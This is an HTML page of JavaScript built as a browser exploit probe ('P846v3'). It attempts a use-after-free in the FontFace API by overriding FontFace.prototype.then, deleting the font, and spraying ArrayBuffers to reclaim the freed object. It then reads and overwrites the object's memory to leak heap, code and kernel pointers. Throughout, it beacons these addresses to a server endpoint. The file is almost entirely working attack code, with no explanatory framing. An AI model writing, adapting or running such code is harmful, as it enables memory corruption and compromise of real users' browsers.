<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P846v3</title>
<style>
body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
</style>
</head><body>
<pre id="o">P846v3: FontFace Data-Flow Oracle (no groom, 3-tap, 500-wide)</pre>
<script>
'use strict';
var O=document.getElementById('o');
function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
function bn(t,d){
  try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P846v3-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
  x.send();}catch(e){}
}
function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}

bn('BOOT','start');
log('Loading...','info');

var fontAB=null, face=null;

/* ===== UAF ATTEMPT 1 ===== */
function attempt1(){
  var st=document.createElement('style');
  st.textContent="@font-face{font-family:zz1;src:local(Arial);unicode-range:U+0042;}";
  document.head.appendChild(st);
  var f=new FontFace('z1',"local('Helvetica')",{unicodeRange:'U+0041'});
  document.fonts.add(f);
  void f.loaded;

  var fired=false;
  Object.defineProperty(FontFace.prototype,'then',{
    configurable:true,
    get:function(){
      if(fired)return undefined;
      fired=true;
      st.remove();st.textContent='';
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      var abs=[];
      for(var i=0;i<500;i++)abs.push(new ArrayBuffer(192));
      for(var i=0;i<abs.length;i++){
        var bu=new BigUint64Array(abs[i]);
        for(var j=0;j<bu.length;j++){
          if(bu[j]!==BigInt(0)){fontAB=abs[i];face=f;break;}
        }
        if(fontAB)break;
      }
      return undefined;
    },set:function(){}
  });
  document.fonts.load('1em z1, zz1','A');

  return new Promise(function(resolve){
    setTimeout(function(){
      delete FontFace.prototype.then;
      bn('A1',fontAB?'HIT':'MISS');
      resolve(!!fontAB);
    },400);
  });
}

/* ===== UAF ATTEMPT 2 ===== */
function attempt2(){
  var st=document.createElement('style');
  st.textContent="@font-face{font-family:zz2;src:local(Arial);unicode-range:U+0043;}";
  document.head.appendChild(st);
  var f=new FontFace('z2',"local('Helvetica')",{unicodeRange:'U+0043'});
  document.fonts.add(f);
  void f.loaded;

  var fired=false;
  Object.defineProperty(FontFace.prototype,'then',{
    configurable:true,
    get:function(){
      if(fired)return undefined;
      fired=true;
      st.remove();st.textContent='';
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      var abs=[];
      for(var i=0;i<500;i++)abs.push(new ArrayBuffer(192));
      for(var i=0;i<abs.length;i++){
        var bu=new BigUint64Array(abs[i]);
        for(var j=0;j<bu.length;j++){
          if(bu[j]!==BigInt(0)){fontAB=abs[i];face=f;break;}
        }
        if(fontAB)break;
      }
      return undefined;
    },set:function(){}
  });
  document.fonts.load('1em z2, zz2','B');

  return new Promise(function(resolve){
    setTimeout(function(){
      delete FontFace.prototype.then;
      bn('A2',fontAB?'HIT':'MISS');
      resolve(!!fontAB);
    },400);
  });
}

/* ===== UAF ATTEMPT 3 ===== */
function attempt3(){
  var st=document.createElement('style');
  st.textContent="@font-face{font-family:zz3;src:local(Arial);unicode-range:U+0044;}";
  document.head.appendChild(st);
  var f=new FontFace('z3',"local('Helvetica')",{unicodeRange:'U+0044'});
  document.fonts.add(f);
  void f.loaded;

  var fired=false;
  Object.defineProperty(FontFace.prototype,'then',{
    configurable:true,
    get:function(){
      if(fired)return undefined;
      fired=true;
      st.remove();st.textContent='';
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      var abs=[];
      for(var i=0;i<500;i++)abs.push(new ArrayBuffer(192));
      for(var i=0;i<abs.length;i++){
        var bu=new BigUint64Array(abs[i]);
        for(var j=0;j<bu.length;j++){
          if(bu[j]!==BigInt(0)){fontAB=abs[i];face=f;break;}
        }
        if(fontAB)break;
      }
      return undefined;
    },set:function(){}
  });
  document.fonts.load('1em z3, zz3','C');

  return new Promise(function(resolve){
    setTimeout(function(){
      delete FontFace.prototype.then;
      bn('A3',fontAB?'HIT':'MISS');
      resolve(!!fontAB);
    },400);
  });
}

/* ===== MAIN: Try up to 3 times ===== */
attempt1().then(function(hit){
  if(hit) return runOracle();
  log('  Attempt 1 miss, retrying...','fail');
  return attempt2();
}).then(function(hit){
  if(hit===undefined) return; /* already in oracle */
  if(hit) return runOracle();
  log('  Attempt 2 miss, retrying...','fail');
  return attempt3();
}).then(function(hit){
  if(hit===undefined) return;
  if(hit) return runOracle();
  log('  ALL 3 attempts missed!','fail');
  bn('ALL-MISS','3x');
  log('====== P846v3 DONE (no UAF) ======','hot');
  bn('DONE-MISS','0');
});

/* ============================================================
   THE ORACLE — runs once we have fontAB
   ============================================================ */
function runOracle(){
  var bu=new BigUint64Array(fontAB);
  var u8=new Uint8Array(fontAB);
  var H=bu[11]-BigInt(0x68);
  var q13=bu[13];
  log('','');
  log('--- FontFace UAF HIT ---','ok');
  log('H = '+hexQ(H),'ok');
  log('q13 = '+hexQ(q13)+' (CSSFontSelector*)','ok');
  bn('HEAP','H='+hexQ(H)+'|q13='+hexQ(q13));

  /* === BASELINE === */
  var BL=[];
  for(var i=0;i<24;i++)BL.push(bu[i]);
  var nz=0,codeB=[];
  for(var i=0;i<24;i++){
    var v=BL[i]; if(v===BigInt(0))continue; nz++;
    var hi=Number(v>>BigInt(32));
    var tag=(hi>=0x10&&hi<=0x1000)?'HEAP':(hi>0x10&&hi<0x8000)?'CODE':(hi>=0xFFFF8000)?'KERN':'?';
    if(tag==='CODE'||tag==='KERN')codeB.push('q'+i+'='+hexQ(v));
    log('  q'+i.toString().padStart(2,' ')+' +0x'+(i*8).toString(16).padStart(3,'0')+' = '+hexQ(v)+' ['+tag+']',
      tag==='CODE'||tag==='KERN'?'hot':'info');
  }
  bn('BL','nz='+nz+'|code='+codeB.length+(codeB.length?'|'+codeB.join('|'):''));

  /* === C: m_status sweep === */
  log('','');
  log('--- C: m_status sweep (load per status) ---','hot');
  var SO=130;
  var cRes=[];
  for(var s=0;s<=4;s++){
    var snap=new Uint8Array(192); snap.set(u8);
    u8[SO]=s;
    var err=null;
    try{face.load();}catch(e){err=e.name;}
    var chg=[],code=[];
    for(var i=0;i<192;i++)if(u8[i]!==snap[i])chg.push('+'+i.toString(16)+'='+snap[i].toString(16)+'→'+u8[i].toString(16));
    for(var qi=0;qi<24;qi++){var v=bu[qi];if(v!==BL[qi]&&v!==BigInt(0)){var hi=Number(v>>BigInt(32));if((hi>0x10&&hi<0x8000)||(hi>=0xFFFF8000))code.push('q'+qi);}}
    var r='s'+s+(err?'E':'')+'c'+chg.length+'p'+code.length;
    if(chg.length)r+='|'+chg.slice(0,4).join(',');
    if(code.length)r+='|CODE:'+code.join(',');
    cRes.push(r);
    log('  s='+s+': '+(err||'ok')+' chg='+chg.length+(code.length?' ***CODE***':'')+
      (chg.length?' ['+chg.slice(0,3).join(' ')+']':''),code.length?'hot':(chg.length?'ok':''));
    u8.set(snap);
  }
  bn('C',cRes.join('||'));

  /* === D: Promise trace (200ms) === */
  log('','');
  log('--- D: Promise trace ---','hot');
  var snapD=new Uint8Array(192); snapD.set(u8);
  u8[SO]=0;
  var pType='?';
  try{var p=face.loaded;pType=p&&typeof p.then==='function'?'promise':'val';}catch(e){pType='E';}
  bn('D-T',pType);

  return new Promise(function(resolve){setTimeout(resolve,200);}).then(function(){
    var dChg=[];
    for(var i=0;i<192;i++)if(u8[i]!==snapD[i])dChg.push('+'+i.toString(16)+'='+snapD[i].toString(16)+'→'+u8[i].toString(16));
    bn('D','n='+dChg.length+(dChg.length?'|'+dChg.slice(0,6).join(','):''));
    log('  promise('+pType+'): '+dChg.length+' chg'+(dChg.length?' ['+dChg.slice(0,3).join(' ')+']':''),'info');
    u8.set(snapD);

    /* === E: Zero each qword → load → check rewrite === */
    log('','');
    log('--- E: Zero-load-check per qword ---','hot');
    var eHits=[];
    for(var qi=0;qi<24;qi++){
      var orig=bu[qi];
      bu[qi]=BigInt(0);
      u8[SO]=0;
      try{face.load();}catch(e){}
      var nv=bu[qi];
      if(nv!==BigInt(0)){
        var hi=Number(nv>>BigInt(32));
        var tag=(hi>0x10&&hi<0x8000)?'CODE':(hi>=0xFFFF8000)?'KERN':(nv===orig)?'rest':'new';
        eHits.push('q'+qi+'='+hexQ(nv)+'('+tag+')');
        log('  q'+qi+': 0→'+hexQ(nv)+' ['+tag+']',tag==='CODE'||tag==='KERN'?'hot':'ok');
      }
      bu[qi]=orig; u8[SO]=2;
    }
    bn('E','n='+eHits.length+'|'+eHits.slice(0,10).join('|'));
    if(!eHits.length)log('  No rewrites','fail');

    /* === F: q13→self redirect === */
    log('','');
    log('--- F: q13→H redirect ---','hot');
    var snapF=new Uint8Array(192); snapF.set(u8);
    bu[13]=H; u8[SO]=0;
    var fErr=null;
    try{face.load();}catch(e){fErr=e.name;}
    var fChg=[],fCode=[];
    for(var i=0;i<192;i++)if(u8[i]!==snapF[i])fChg.push('+'+i.toString(16));
    for(var qi=0;qi<24;qi++){var v=bu[qi];var hi=Number(v>>BigInt(32));if(v!==BigInt(0)&&((hi>0x10&&hi<0x8000)||(hi>=0xFFFF8000)))fCode.push('q'+qi+'='+hexQ(v));}
    bn('F','err='+(fErr||'ok')+'|chg='+fChg.length+'|code='+fCode.length+(fCode.length?'|'+fCode.join(','):''));
    log('  '+(fErr||'ok')+' chg='+fChg.length+(fCode.length?' ***'+fCode.join(' ')+'***':''),fCode.length?'hot':'info');
    u8.set(snapF);

    /* === G: fonts.check + iteration === */
    log('','');
    log('--- G: fonts ops ---','hot');
    var snapG=new Uint8Array(192); snapG.set(u8);
    try{document.fonts.add(face);}catch(e){}
    try{document.fonts.check('1em z1');}catch(e){}
    try{document.fonts.forEach(function(){});}catch(e){}
    var gChg=0;
    for(var i=0;i<192;i++)if(u8[i]!==snapG[i])gChg++;
    bn('G','chg='+gChg);
    log('  fonts ops: '+gChg+' byte changes','info');

    /* === H: Property reads === */
    log('','');
    log('--- H: Face prop reads ---','hot');
    var snapH=new Uint8Array(192); snapH.set(u8);
    var pp={};
    try{pp.fam=face.family;}catch(e){pp.fam='E';}
    try{pp.sty=face.style;}catch(e){pp.sty='E';}
    try{pp.wgt=face.weight;}catch(e){pp.wgt='E';}
    try{pp.str=face.stretch;}catch(e){pp.str='E';}
    try{pp.ur=face.unicodeRange;}catch(e){pp.ur='E';}
    try{pp.dsp=face.display;}catch(e){pp.dsp='E';}
    try{pp.st=face.status;}catch(e){pp.st='E';}
    var hChg=0,hCode=[];
    for(var i=0;i<192;i++)if(u8[i]!==snapH[i])hChg++;
    for(var qi=0;qi<24;qi++){var v=bu[qi];if(v!==BL[qi]&&v!==BigInt(0)){var hi=Number(v>>BigInt(32));if((hi>0x10&&hi<0x8000)||(hi>=0xFFFF8000))hCode.push('q'+qi+'='+hexQ(v));}}
    bn('H','chg='+hChg+'|code='+hCode.length+'|fam='+pp.fam+'|st='+pp.st+'|dsp='+pp.dsp);
    log('  fam='+pp.fam+' sty='+pp.sty+' wgt='+pp.wgt+' st='+pp.st,'info');
    log('  reads: '+hChg+' chg'+(hCode.length?' ***CODE***':''),'info');

    /* === I: Property writes === */
    log('','');
    log('--- I: Face prop writes ---','hot');
    var snapI=new Uint8Array(192); snapI.set(u8);
    try{face.family='XXX';}catch(e){}
    try{face.style='italic';}catch(e){}
    try{face.weight='bold';}catch(e){}
    try{face.display='swap';}catch(e){}
    var iChg=[],iCode=[];
    for(var i=0;i<192;i++)if(u8[i]!==snapI[i])iChg.push('+'+i.toString(16)+'='+snapI[i].toString(16)+'→'+u8[i].toString(16));
    for(var qi=0;qi<24;qi++){var v=bu[qi];if(v!==BL[qi]&&v!==BigInt(0)){var hi=Number(v>>BigInt(32));if((hi>0x10&&hi<0x8000)||(hi>=0xFFFF8000))iCode.push('q'+qi+'='+hexQ(v));}}
    bn('I','chg='+iChg.length+'|code='+iCode.length+(iChg.length?'|'+iChg.slice(0,8).join(','):'')+
      (iCode.length?'|CODE='+iCode.join(','):''));
    log('  writes: '+iChg.length+' chg'+(iCode.length?' ***CODE: '+iCode.join(' ')+'***':''),
      iCode.length?'hot':(iChg.length?'ok':'info'));
    if(iChg.length)log('  ['+iChg.slice(0,6).join(' ')+']','info');

    log('','');
    log('====== P846v3 COMPLETE ======','hot');
    bn('DONE','H='+hexQ(H)+'|q13='+hexQ(q13)+'|codeBL='+codeB.length);
  });
}
</script></body></html>
